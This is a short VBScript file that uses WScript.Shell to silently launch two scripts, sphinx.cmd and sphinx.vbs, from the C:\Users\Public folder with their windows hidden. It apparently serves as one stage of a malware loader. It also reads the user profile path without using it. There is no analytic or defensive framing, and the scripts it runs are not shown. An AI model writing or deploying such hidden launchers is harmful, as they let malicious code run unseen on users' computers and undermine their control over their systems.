set sphinx = wscript.createobject("wscript.shell")
set userprofile = sphinx.ExpandEnvironmentStrings("%userprofile%")
userpath = userprofile
sphinx.run chr(34) & "C:\Users\Public\sphinx.cmd" & chr(34), 0
sphinx.run chr(34) & "C:\Users\Public\sphinx.vbs" & chr(34), 0